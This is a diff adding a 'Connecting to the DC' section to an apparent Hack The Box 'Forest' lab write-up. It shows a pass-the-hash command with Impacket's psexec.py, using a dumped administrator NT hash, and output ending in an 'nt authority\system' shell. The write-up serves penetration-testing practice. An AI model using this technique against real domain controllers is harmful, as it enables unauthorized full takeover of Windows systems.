@@ -192,5 +192,24 @@ The administrator password NT hash is dumped!
 
 ## Connecting to the DC
 
+I use the psexec.py tool to connect to the DC.
 
+```bash
+# psexec.py -hashes :"32693b11e6aa90eb43d32c72a07ceea6" "htb.local"/"administrator"@"FOREST.htb.local"
+Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies
 
+[*] Requesting shares on FOREST.htb.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file IMnGApIn.exe
+[*] Opening SVCManager on FOREST.htb.local.....
+[*] Creating service MnJq on FOREST.htb.local.....
+[*] Starting service MnJq.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+
+I have now a shell as `nt authority\system`!
